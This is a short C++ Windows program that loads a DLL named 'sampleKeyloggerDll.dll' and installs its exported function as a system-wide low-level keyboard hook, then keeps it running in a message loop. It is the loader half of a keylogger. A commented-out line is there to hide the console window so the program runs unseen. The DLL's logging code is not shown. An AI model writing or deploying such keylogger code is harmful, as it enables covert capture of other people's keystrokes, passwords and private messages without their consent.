//#include "pch.h"
#include "pch.h"
#include "windows.h"
#include <stdio.h>
#include <iostream>
//#define _WIN32_WINNT 0x0500

#include<fstream>
#include<windows.h>

HHOOK hKeyboardHook;

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}


int main(int argc, char** argv)
{
    HANDLE hThread;
    DWORD dwThread;

    printf("CTRL-y  for  H O T K E Y  \n");
    printf("CTRL-q  to quit  \n");

    HMODULE hInstance = LoadLibraryA("sampleKeyloggerDll.dll");
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hInstance, "KeyboardEvent");
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookProc, hInstance, 0);
    MessageLoop();
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;

    /* uncomment to hide console window */
 //ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);

}